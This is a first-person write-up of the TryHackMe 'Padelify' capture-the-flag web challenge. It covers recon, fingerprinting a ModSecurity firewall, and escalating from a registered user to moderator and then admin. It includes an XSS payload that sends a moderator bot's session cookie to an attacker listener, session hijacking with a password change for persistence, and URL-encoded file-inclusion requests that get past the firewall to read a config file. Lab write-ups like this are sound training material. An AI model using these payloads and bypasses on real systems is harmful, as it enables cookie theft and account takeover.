Padelify

TryHackMe CTF. A web app with a WAF, a moderator bot, and a config file I wanted to read.

I'm actually not going to start off with an Nmap scan quite yet.

This challenge lands at the end of a heavy firewall exploitation series, so we'll kick things off with a curl:

┌──(jenn㉿local)-[~]
└─$ curl -I 10.145.143.71

A 403. Something is blocking us, but the headers alone don't tell us what. The server identifies itself as Apache/2.4.58. The ETag starts with b38, which is hexadecimal for 2872, matching the response Content-Length. I'll keep that number in mind as we investigate.

Next, I ran two Nmap scans:

┌──(jenn㉿local)-[~]
└─$ nmap -sS -Pn -sC -sV -T4 -A 10.145.143.71

And the second scan focused on potential vulnerabilities:

┌──(jenn㉿local)-[~]
└─$ nmap -sS -Pn -sC -sV --script=vuln -T4 -A 10.145.143.71

I'll spare you the entire output on the second scan, but here are some key findings:

Open ports

  • Port 22: SSH
  • Port 80: HTTP

Key findings

  • PHPSESSID does not have the HttpOnly flag on the home page or /login.php. If we find XSS, JavaScript may be able to read the session cookie.
  • The scan also found the following paths: /register.php, /index.php, /login.php, /logs, /config, /css, and /js.

Let's fingerprint this firewall with wafw00f:

┌──(jenn㉿local)-[~]
└─$ wafw00f http://10.145.143.71

Good boy, wafw00f. A WAF or similar security solution is interfering with the requests. The scan doesn't identify the product yet.

Thanks to this heavy-hitter of a firewall, we're not getting many details. Before we fully dive in, let's put on a disguise and see if we can get less guarded information.

┌──(jenn㉿local)-[~]
└─$ curl -s -H "User-Agent: Mozilla/5.0" http://10.145.143.71

All signs are starting to point to XSS as the first exploit.

Let's visit the site in-browser.

As promised, there's a form, /register.php on the Target IP.

Let's test it out by making an account and catching the request in Burp so we can see what we're working with.

Registration = crafted. FoxyProxy set to Burp, Intercept on. I'll go ahead and click Submit...

First things first: passwords are captured in plaintext (hence, the crappy redacting).

Second, I think we're dealing with a moderator bot. Excellent news.

If my hunch is correct, that means we can craft an XSS payload that will be picked up by the moderator, who will "review" the request.

We may have to do some recon on what rules control the firewall. We'll find out what it blocks as we go.

Let's set up a Python listener and try to grab a cookie.

┌──(jenn㉿local)-[~]
└─$ python3 -m http.server 8888

I tried mixed case in the cookie property name first:

<body onload="new Image().src='http://192.168.128.19:8888?c='+document['cOOkiE'];">

The bot reached the listener, but the cookie value came back as undefined. JavaScript property names are case sensitive, so document['cOOkiE'] didn't read document.cookie.

Let's tone the string concatenation down a bit and try again.

<body onload="new Image().src='http://192.168.128.19:8888?c='+document['coo' + 'kie'];">

Nailed it.

Since we know the httponly flag is not set, we can take our stolen cookie and run this workflow:

Inspect site > Storage tab > Swap out the "Value" for the stolen cookie > reload...

The dashboard now welcomes us as moderator. I went ahead and updated the mod password to maintain persistence.

Now we need to climb up one level to admin. Well, I'm fairly certain it's one level. Assumptions can be dangerous.

From our initial enumeration, /config looks promising. /logs is a close second.

We need to enumerate more of the site's directories to find where the config lives. Very little can be interacted with on /dashboard.php. I can approve slap_master's request and triangulate this, but I digress.

To run gobuster without the firewall strong-arming us, we'll have to put our Mozilla disguise back on:

┌──(jenn㉿local)-[~]
└─$ gobuster dir -u http://10.145.143.71/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
  -a "Mozilla/5.0" -x php,txt,conf,log -t 50

That -a flag line is critical to evade getting firewalled.

As gobuster runs, I can't help but notice App.conf shows 2872 bytes, the same number from our initial curl.

Let's personally thank my trauma for bringing my attention to the tiniest details.

Hold up. App.conf returned 403, and the later .conf requests also come back at 2872 bytes. We know that size belongs to the block response, but not necessarily App.conf. 2872 clues us in about the filter. We still need to see what's inside the file. Time to read it.

Let's curl again, still in disguise:

┌──(jenn㉿local)-[~]
└─$ curl -A "Mozilla/5.0" http://10.145.143.71/config/App.conf

Ummm....

Blocked. We'll have to get crafty with encoding/LFI. It's like when there's a note next to a button that says, "Don't push the button."

I'm going to push the darn button.

I need a more detailed map of where the config lives without getting blocked out:

┌──(jenn㉿local)-[~]
└─$ gobuster dir -u http://10.145.143.71/config/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -a "Mozilla/5.0" -x php,txt,conf,log -t 50

Every .conf request in this scan returned 403 with a 2872 byte response, matching the length we saw in the first curl -I.

Let's take more of an interest in /logs.

curl -A "Mozilla/5.0" http://10.145.143.71/logs/

This already feels like the path of least resistance.

curl -A "Mozilla/5.0" http://10.145.143.71/logs/error.log

Aha! Let me zoom in for you...

We found a reference to admin_info. We also found the WAF product: ModSecurity. The logs show it blocking .conf requests and encoded payloads. Time to get extra stealthy.

curl -A "Mozilla/5.0" http://10.145.143.71/config/app.conf

Several more encoding attempts were blocked.

Time for Full Metal Jenn.

Single encoding:

curl -A "Mozilla/5.0" http://10.145.143.71/%63%6f%6e%66%69%67%2f%61%70%70%2e%63%6f%6e%66

DOUBLE encoding:

curl -A "Mozilla/5.0" http://10.145.143.71/%2563%256f%256e%2566%2569%2567%252f%2561%2570%2570%252e%2563%256f%256e%2566

Every single character DOUBLE ENCODED:

curl -A "Mozilla/5.0" http://10.145.143.71/%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%32%66%25%36%31%25%37%30%25%37%30%25%32%65%25%36%33%25%36%66%25%36%65%25%36%36

I am now unleashed. Add in the Mod session cookie.

curl -s "http://10.145.143.71/live.php?page=%63%6f%6e%66%69%67%2f%61%70%70%2e%63%6f%6e%66" \
  -H "User-Agent: Mozilla/5.0" \
  -H "Cookie: PHPSESSID=<MOD_SESSION_ID>"

HA!

We can officially log in as admin.

curl -s -X POST "http://10.145.143.71/login.php" \
  -H "User-Agent: Mozilla/5.0" \
  -d "username=admin&password=<ADMIN_PASSWORD>" \
